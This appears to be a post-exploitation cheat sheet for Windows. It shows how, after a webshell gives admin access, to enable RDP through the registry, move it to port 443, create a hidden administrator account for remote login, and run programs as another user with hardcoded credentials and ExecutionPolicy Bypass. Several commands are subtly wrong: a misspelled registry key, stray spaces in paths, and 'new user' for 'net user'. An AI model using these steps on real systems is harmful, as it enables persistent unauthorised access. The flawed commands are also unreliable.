# rdp

https://malrawr.com/04.windows/windows-snippets/

So after getting a webshell on a Windows device that has SYSTEM/Administrator privileges I needed a way to get a regular shell. I tried uploading files through the webshell but nothing worked. Then I thought, well I have admin privleges so I decided to use RDP.

### First start the RDP service with this one liner
```bat
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurentControlSet\Control \TerminalServer" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

### Tunnel RDP out of Port 443
```bat
REG ADD "HKLM\System\CurrentControlSet\Control \TerminalServer\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d 443 /f 
```

### Restart Terminal Services
```bat
net stop termservice
net start termservice
```

## Check if it is running
```bat
tasklist /svc | findstr /C:TermService
```

### Create a new user, add to RDP group, add to admin group
```bat
new user /add [username] [password]
net localgroup "Remote Desktop Users" [username] /add
net localgroup administrators [username] /add
```

### Log into RDP
```bat
rdesktop -u [username] -p [password] [ipaddress]
```

## Using Powershell Runas

This is handy if you ever need to run cmd prompt as another user without being prompted for passsword input. In fact, this will work with running any program, just swap out the cmd.exe part for something else. First you need to prepare the following as a .ps1 file. In this case we'll name it runas.ps1.

```powershell
$username = 'wuseman'
$password = 'wusemanPower'

$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
Start-Process cmd.exe -Credential $credential
```

Then in order to run the script you need to execute it with restrictions off.
```powershell
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File file.ps1
```